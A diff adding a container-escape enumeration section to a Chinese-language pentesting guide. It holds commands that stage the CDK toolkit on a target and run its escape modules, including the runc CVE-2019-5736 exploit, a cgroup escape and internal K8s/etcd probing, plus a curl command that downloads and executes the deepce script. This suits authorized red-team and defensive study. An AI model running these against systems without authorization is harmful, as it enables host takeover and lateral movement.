@@ -453,3 +453,34 @@ find / -name "docker-compose*" 2>/dev/null
 # 查看配置中的密码、挂载点、网络配置
 cat /path/to/docker-compose.yml
 ```
+
+## 11. 容器逃逸自动化枚举
+
+### CDK — 容器渗透工具包（推荐）
+
+CDK 是功能最全的容器/K8s 渗透工具，支持信息收集、逃逸利用、网络探测一体化，已集成到 arsenal 投递库：
+
+```bash
+# 从 arsenal 投递到目标容器后运行
+./cdk evaluate  # 自动枚举所有逃逸路径
+
+# 指定利用方式
+./cdk run shim-pwn          # runc CVE-2019-5736
+./cdk run docker-sock-check # Docker socket 检查
+./cdk run mount-cgroup      # cgroup 逃逸（privileged）
+./cdk run cap-dac-read      # CAP_DAC_READ_SEARCH 利用
+./cdk run service-probe     # K8s API / etcd / kubelet 探测
+
+# 网络探测
+./cdk probe 10.0.0.0/24 22,80,443,2379,6443,8080,10250
+```
+
+### deepce — 备选方案
+
+轻量级 shell 脚本，无需编译，适合无法投递二进制的场景：
+
+```bash
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh
+chmod +x /tmp/deepce.sh
+/tmp/deepce.sh
+```
